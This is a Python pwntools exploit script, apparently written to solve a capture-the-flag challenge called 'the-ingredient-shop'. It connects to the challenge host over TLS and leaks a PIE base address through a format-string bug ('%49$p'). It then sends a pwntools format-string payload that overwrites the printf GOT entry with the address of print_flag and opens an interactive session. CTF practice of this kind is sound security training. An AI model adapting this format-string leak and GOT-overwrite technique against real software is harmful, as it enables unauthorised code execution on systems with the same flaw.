#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './shop_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc the-ingredient-shop-e1597cb3ddc9284d.challs.brunnerne.xyz 443'.split()

if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None

gdbscript = '''
b *(get_input+288)
continue
'''.format(**locals())

p = start()
# leak pie (format string offset different in local)
p.sendline('%49$p')
p.recvuntil('here is your choice')
res = p.recvlines(2)[1] 
pie = eval(res.decode()) - exe.sym.main
log.info(f'leak_pie: {res}')
log.info(f'pie: {hex(pie)}')

# overwrite
log.info(f'print_flag: {hex(pie+exe.sym.print_flag)}')
overwrite_payload = fmtstr_payload(8, {pie+ exe.got.printf: pie+exe.sym.print_flag}, write_size='byte')
p.sendline(overwrite_payload)

p.interactive()